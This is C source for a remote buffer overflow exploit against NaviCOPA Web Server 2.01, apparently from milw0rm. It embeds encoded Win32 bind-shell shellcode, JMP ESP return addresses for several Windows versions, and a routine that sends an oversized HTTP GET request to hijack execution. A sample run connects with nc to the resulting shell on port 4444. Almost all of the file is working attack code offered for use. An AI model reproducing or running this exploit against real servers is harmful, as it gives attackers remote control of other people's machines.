/*
navi_exp.c
NaviCOPA Web Server 2.01 0day Remote Buffer Overflow Exploit
Coded by h07 <h07@interia.pl>
Tested on XP SP2 Polish, 2000 SP4 Polish
Example:

C:\>navi_exp 192.168.0.1 0

[*] NaviCOPA Web Server 2.01 0day Remote Buffer Overflow Exploit
[*] Coded by h07 <h07@interia.pl>
[+] Sending buffer: OK
[*] Check your shell on 192.168.0.1:4444
[*] Press enter to quit


C:\>nc -v 192.168.0.1 4444
[192.168.0.1] 4444 (?) open
Microsoft Windows XP [Wersja 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\windows\system32>
*/

#include <winsock2.h>
#define PORT 80
#define BUFF_SIZE 1024

typedef struct
 {
 char os_name[32];
 unsigned long ret;
 } target;


char shellcode[] =

/*
Win32_bind shellcode
Encoder: PexFnstenvMov
Bad chars: 0x00 0x20 0x0a 0x0d 0x2f 0x3f
Thx metasploit.com
*/

"\x6a\x50\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x91\xba\x06"
"\x13\x83\xeb\xfc\xe2\xf4\x6d\xd0\xed\x5e\x79\x43\xf9\xec\x6e\xda"
"\x8d\x7f\xb5\x9e\x8d\x56\xad\x31\x7a\x16\xe9\xbb\xe9\x98\xde\xa2"
"\x8d\x4c\xb1\xbb\xed\x5a\x1a\x8e\x8d\x12\x7f\x8b\xc6\x8a\x3d\x3e"
"\xc6\x67\x96\x7b\xcc\x1e\x90\x78\xed\xe7\xaa\xee\x22\x3b\xe4\x5f"
"\x8d\x4c\xb5\xbb\xed\x75\x1a\xb6\x4d\x98\xce\xa6\x07\xf8\x92\x96"
"\x8d\x9a\xfd\x9e\x1a\x72\x52\x8b\xdd\x77\x1a\xf9\x36\x98\xd1\xb6"
"\x8d\x63\x8d\x17\x8d\x53\x99\xe4\x6e\x9d\xdf\xb4\xea\x43\x6e\x6c"
"\x60\x40\xf7\xd2\x35\x21\xf9\xcd\x75\x21\xce\xee\xf9\xc3\xf9\x71"
"\xeb\xef\xaa\xea\xf9\xc5\xce\x33\xe3\x75\x10\x57\x0e\x11\xc4\xd0"
"\x04\xec\x41\xd2\xdf\x1a\x64\x17\x51\xec\x47\xe9\x55\x40\xc2\xe9"
"\x45\x40\xd2\xe9\xf9\xc3\xf7\xd2\x17\x4f\xf7\xe9\x8f\xf2\x04\xd2"
"\xa2\x09\xe1\x7d\x51\xec\x47\xd0\x16\x42\xc4\x45\xd6\x7b\x35\x17"
"\x28\xfa\xc6\x45\xd0\x40\xc4\x45\xd6\x7b\x74\xf3\x80\x5a\xc6\x45"
"\xd0\x43\xc5\xee\x53\xec\x41\x29\x6e\xf4\xe8\x7c\x7f\x44\x6e\x6c"
"\x53\xec\x41\xdc\x6c\x77\xf7\xd2\x65\x7e\x18\x5f\x6c\x43\xc8\x93"
"\xca\x9a\x76\xd0\x42\x9a\x73\x8b\xc6\xe0\x3b\x44\x44\x3e\x6f\xf8"
"\x2a\x80\x1c\xc0\x3e\xb8\x3a\x11\x6e\x61\x6f\x09\x10\xec\xe4\xfe"
"\xf9\xc5\xca\xed\x54\x42\xc0\xeb\x6c\x12\xc0\xeb\x53\x42\x6e\x6a"
"\x6e\xbe\x48\xbf\xc8\x40\x6e\x6c\x6c\xec\x6e\x8d\xf9\xc3\x1a\xed"
"\xfa\x90\x55\xde\xf9\xc5\xc3\x45\xd6\x7b\x61\x30\x02\x4c\xc2\x45"
"\xd0\xec\x41\xba\x06\x13";

char buffer[BUFF_SIZE];

target list[] =
 {
 "XP SP2 Polish",
 0x7d168877, //JMP ESP

 "XP SP2 English",
 0x7ca58265, //JMP ESP

 "XP SP2 German",
 0x7cb4d5ac, //JMP ESP

 "2000 SP4 Polish",
 0x77596433, //JMP ESP

 "2000 SP4 English",
 0x78326433  //JMP ESP
 };

int main(int argc, char *argv[])
{
WSADATA wsa;
int sock, os, r_len, i,
a = (sizeof(list) / sizeof(target)) - 1;
unsigned long eip;
struct hostent *he;
struct sockaddr_in client;

printf("\n[*] NaviCOPA Web Server 2.01 0day Remote Buffer Overflow Exploit\n");
printf("[*] Coded by h07 <h07@interia.pl>\n");

if(argc < 3)
 {
 printf("[*] Usage: %s <host> <system>\n", argv[0]);
 printf("[*] Sample: %s 192.168.0.1 0\n", argv[0]);
 printf("[*] Systems..\n");
 for(i = 0; i <= a; i++)
 printf("[>] %d: %s\n", i, list[i].os_name);
 return 1;
 }

WSAStartup(MAKEWORD(2, 0), &wsa);

os = atoi(argv[2]);

if((os < 0) || (os > a))
 {
 printf("[-] Error: unknown target %d\n", os);
 return -1;
 }

eip = list[os].ret;

sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

if((he = gethostbyname(argv[1])) == NULL)
 {
 printf("[-] Unable to resolve\n");
 return -1;
 }

client.sin_addr = *((struct in_addr *)he->h_addr);
client.sin_port = htons(PORT);
client.sin_family = AF_INET;

if(connect(sock, (struct sockaddr *) &client, sizeof(client)) == -1)
 {
 printf("[-] Error: connect()\n");
 return -1;
 }

r_len = 234;
memset(buffer, 0x41, r_len);
memcpy(buffer, "GET ", 4);
*((unsigned long*)(&buffer[r_len])) = eip;
memset(buffer + (r_len + 4), 0x90, 32);
strcat(buffer, shellcode);
strcat(buffer, " HTTP/1.1\r\n\r\n\x00");

//buffer["GET " + ("A" * 230) + RET + (NOP * 32) + shellcode + " HTTP/1.1\r\n\r\n\x00"]

if(send(sock, buffer, strlen(buffer), 0) != -1)
 {
 printf("[+] Sending buffer: OK\n");
 printf("[*] Check your shell on %s:4444\n", argv[1]);
 }
 else
 printf("[-] Sending buffer: failed\n");

printf("[*] Press enter to quit\n");
getchar();

return 0;
}

// milw0rm.com [2006-09-27]
